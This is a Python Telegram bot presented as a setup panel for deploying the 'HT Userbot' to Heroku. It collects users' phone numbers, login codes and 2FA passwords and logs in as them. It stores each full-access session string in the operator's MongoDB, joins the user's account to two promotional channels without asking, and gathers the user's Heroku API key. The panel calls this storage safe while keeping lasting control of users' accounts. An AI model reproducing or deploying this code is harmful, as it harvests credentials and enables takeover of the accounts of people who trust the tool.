import os
import heroku3
import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.tl.functions.channels import JoinChannelRequest
from motor.motor_asyncio import AsyncIOMotorClient

# Heroku Config Vars-dan məlumatları çəkirik
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
MONGO_URL = os.environ.get("MONGO_URL")
GITHUB_REPO = "https://github.com/Xeyaldi/userbot"

# MongoDB Bağlantısı
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client["ht_generator_db"]
users_col = db["users"]

# Generator Botu
bot = TelegramClient('ht_gen_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🚀 **HT USERBOT Quraşdırma Paneli**\n\n"
        "Məlumatlarınız MongoDB bazasında təhlükəsiz saxlanılacaq.",
        buttons=[Button.inline("✅ Qurmağa Başla", data="setup")]
    )

@bot.on(events.CallbackQuery(data="setup"))
async def setup_process(event):
    user_id = event.sender_id
    async with bot.conversation(event.chat_id) as conv:
        # 1. Nömrəni alırıq
        await conv.send_message("📞 **Nömrənizi daxil edin:**\n(Məsələn: +994501234567)")
        phone = (await conv.get_response()).text
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.send_code_request(phone)
        except Exception as e:
            await conv.send_message(f"❌ Xəta: {e}")
            return

        # 2. Kodu alırıq (Aralıqlı formatda)
        await conv.send_message(
            "📩 **Telegram kodunu daxil edin.**\n\n"
            "⚠️ **Vacib:** Kodu rəqəmlər arası boşluqla yazın (Məs: `1 2 3 4 5`).",
            parse_mode="markdown"
        )
        raw_code = (await conv.get_response()).text
        otp_code = raw_code.replace(" ", "")

        try:
            await client.sign_in(phone, otp_code)
        except SessionPasswordNeededError:
            await conv.send_message("🔐 **2FA (İkiadımlı təsdiq) kodunu yazın:**")
            pwd = (await conv.get_response()).text
            await client.sign_in(password=pwd)

        # 3. Məlumatları qeyd edirik
        string_session = client.session.save()
        
        # MongoDB-yə yaddaşa veririk (Həm köhnəni yeniləyir, həm yenisini yazır)
        await users_col.update_one(
            {"user_id": user_id},
            {"$set": {"phone": phone, "session": string_session}},
            upsert=True
        )

        # Avtomatik kanallara qatılma
        try:
            await client(JoinChannelRequest("@ht_bots"))
            await client(JoinChannelRequest("@sohbet_qrupus"))
        except: pass

        # 4. Heroku Məlumatları
        await conv.send_message("🔑 **Heroku API Key daxil edin:**")
        h_api = (await conv.get_response()).text
        
        await conv.send_message("🏷 **Heroku App Name (Təzə ad):**")
        h_app_name = (await conv.get_response()).text

        await conv.send_message("⚙️ **MongoDB Linkinizi daxil edin:**\n(Userbotun yaddaşı üçün)")
        user_mongo = (await conv.get_response()).text

        await conv.send_message("⌛ **Userbot Heroku-ya yüklənir...**")

        # 5. Heroku Deploy
        try:
            h_conn = heroku3.from_key(h_api)
            app = h_conn.create_app(name=h_app_name.lower(), region_id_or_name='eu')
            
            app.config().update({
                'API_ID': str(API_ID),
                'API_HASH': API_HASH,
                'SESSION_STRING': string_session,
                'BOT_TOKEN': BOT_TOKEN,
                'MONGO_URL': user_mongo
            })

            source_url = "https://api.github.com/repos/Xeyaldi/userbot/tarball/main"
            h_conn.create_build(app.id, source_url=source_url)

            await conv.send_message(
                "✅ **HT Userbot Hazırdır!**\n\n"
                "Məlumatlar MongoDB-yə yazıldı. Botunuz 2 dəqiqəyə işə düşəcək."
            )
        except Exception as e:
            await conv.send_message(f"❌ Xəta: {e}")

bot.run_until_disconnected()
